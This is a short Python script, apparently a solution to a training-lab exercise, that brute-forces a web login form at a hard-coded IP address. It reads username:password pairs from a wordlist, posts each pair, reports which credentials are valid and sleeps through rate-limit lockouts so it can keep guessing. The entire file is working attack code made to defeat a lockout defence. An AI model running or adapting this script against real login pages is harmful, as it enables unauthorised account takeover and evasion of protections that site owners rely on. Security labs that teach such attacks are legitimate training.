import requests
import time

# file that contains user:pass
userpass_file = "test_wordlist.txt"

# create url using user and password as argument
url = "http://94.237.56.76:52013/question2/"

# rate limit blocks for ?? seconds
lock_time = 0

# message that alert us we hit rate limit
lock_message    = "Too many login failures"

# read user and password
with open(userpass_file, "r") as fh:
    for fline in fh:
        # skip comment
        print("Next line: " + fline)
        if fline.startswith("#"):
            continue

        # take username
        username = fline.split(":")[0]

        # take password, join to keep password that contain a :
        password = ":".join(fline.split(":")[1:])

        # prepare POST data
        data = {
            "userid": username,
            "passwd": password,
            "submit":"submit"
        }

        # do the request
        res = requests.post(url, data=data)

        # handle generic credential error
        if "Invalid credentials" in res.text:
            print("[-] Invalid credentials: userid:{} passwd:{}".format(username, password))
        # user and password were valid !
        elif "Access granted" in res.text:
            print("[+] Valid credentials: userid:{} passwd:{}".format(username, password))
        # hit rate limit, let's say we have to wait ?? seconds
        elif lock_message in res.text:
            lock_time = res.text.split(" ")[321]
            print("[-] Hit rate limit, sleeping " + lock_time)
            # do the actual sleep plus 0.5 to be sure
            time.sleep(float(lock_time)+0.5)
            print("Done sleep")
